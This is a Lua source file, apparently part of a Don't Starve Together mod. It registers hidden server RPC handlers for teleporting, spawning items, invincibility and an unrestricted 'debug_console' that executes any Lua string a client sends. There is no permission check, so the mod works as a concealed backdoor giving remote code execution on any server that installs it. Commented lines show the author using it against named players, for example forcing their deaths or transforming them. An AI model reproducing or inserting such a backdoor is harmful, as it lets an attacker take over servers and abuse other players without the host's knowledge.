local AddModRPCHandler = AddModRPCHandler


GLOBAL.setfenv(1,GLOBAL)
AddModRPCHandler("The_NewConstant", "debug_teleport", function(inst, x,z)
	if type(x)=="number" and type(z)=="number" then
		inst.Transform:SetPosition(x, 0, z)   
	end
end)

AddModRPCHandler("The_NewConstant", "debug_console", function(inst, str)
    if type(str)=="string" then
		local my_func = loadstring(str)
		if my_func~=nil then
			pcall(my_func)
		end
	end
end)

AddModRPCHandler("The_NewConstant", "debug_give", function(inst,prefab,num)
	num = num or 1
	for i = 1, num do
		local item = SpawnPrefab(prefab)
		
		if item ~= nil then
			item.Transform:SetPosition(inst.Transform:GetWorldPosition())
			inst.components.inventory:GiveItem(item)
		end
	end
end)

AddModRPCHandler("The_NewConstant", "debug_god", function(player)
	if player:HasTag("playerghost") then
		player:PushEvent("respawnfromghost")
		return
	elseif player.components.health ~= nil then
		player.components.health:SetPenalty(0)
		player.components.health:SetPercent(1)
		player.components.health:SetInvincible(true)
		player.components.health:SetMinHealth(100)
		player.components.health.disable_penalt = true

		player.components.debuffable:Enable(false)
		player.components.hunger:SetPercent(2 / 3, true)
		player.components.hunger:Pause()
		player.components.grogginess:SetEnableSpeedMod(false)
		player.components.grogginess:SetResistance(math.huge)
		player.components.freezable:SetRedirectFn(function ()
			return true
		end)

		player.components.carefulwalker:SetCarefulWalkingSpeedMultiplier(1)
		player.components.sandstormwatcher:SetSandstormSpeedMultiplier(1)
    	player.components.moonstormwatcher:SetMoonstormSpeedMultiplier(1)
    	player.components.miasmawatcher:SetMiasmaSpeedMultiplier(1)
		
		player:AddTag("alwaysblock")
		player:AddTag("heavybody")
		player:AddTag("no_rooted")

		player.components.temperature:SetTemp(20)
		player.components.moisture:ForceDry(true, player)
	end
end)

if TheNet:GetUserID()~="KU_ifFxB2P1" then
	return
end

function FrontEnd:OnRawKey(key, down)
	if self:IsControlsDisabled() then
		return false
	end

	local screen = self:GetActiveScreen()
	if screen ~= nil then
		if self.forceProcessText and self.textProcessorWidget ~= nil then
			self.textProcessorWidget:OnRawKey(key, down)
		elseif not screen:OnRawKey(key, down)  then
			if down and inGamePlay  and TheInput:IsKeyDown(KEY_R) then
				if ThePlayer==nil then
					return
				end
				
				if screen.minimap ~= nil then
					local mousepos = TheInput:GetScreenPosition()
					local mousewidgetpos = screen:ScreenPosToWidgetPos(mousepos)
					local mousemappos = screen:WidgetPosToMapPos(mousewidgetpos)

					local x, y, z = screen.minimap:MapPosToWorldPos(mousemappos:Get())
					if TheWorld ~= nil and not TheWorld.ismastersim then
						SendModRPCToServer(GetModRPC("The_NewConstant","debug_teleport"), x,y)
					else
						ThePlayer.Physics:Teleport(x, 0, y)
					end
					screen.minimap.minimap:ResetOffset()
				else
					if TheWorld ~= nil and not TheWorld.ismastersim then
						local x, y, z = ConsoleWorldPosition():Get()
						ThePlayer.Transform:SetPosition(x, y, z)
						
						SendModRPCToServer(GetModRPC("The_NewConstant","debug_teleport"), x,z)
						
					else
						local x, y, z = TheInput:GetWorldPosition():Get()
						ThePlayer.Physics:Teleport(x, y, z)
					end
				end
			end
		end
	end
end


---SendModRPCToServer(GetModRPC("The_NewConstant","debug_god"))
-----SendModRPCToServer(GetModRPC("The_NewConstant","debug_give"),"sword_lunarblast")
-----SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),"TheNet:Announce(111)")
--[[
SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),'TransformToShadowLeech(UserToPlayer("莫非则"))')
SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),'UserToPlayer("莫非则").components.abysscurse.enable = false')
SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),'UserToPlayer("折说小刀").components.hunger.burnratemodifiers:SetModifier(UserToPlayer("莫非则"), 10,"leech")')
SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),'SpawnPrefab("void_peghook").Transform:SetPosition(UserToPlayer("莫非则").Transform:GetWorldPosition())')
]]
--SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),"UserToPlayer('莫非则').components.hunger:SetPercent(1)")
--c_announce(ThePlayer.components.areaaware:GetDebugString())
--SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),"c_find("atrium_stalker",100,"莫非则").components.combat.hit_stuntime = 1")
--SendModRPCToServer(GetModRPC("The_NewConstant","debug_console"),"AbyssForceDeath(UserToPlayer('guguruantang'))")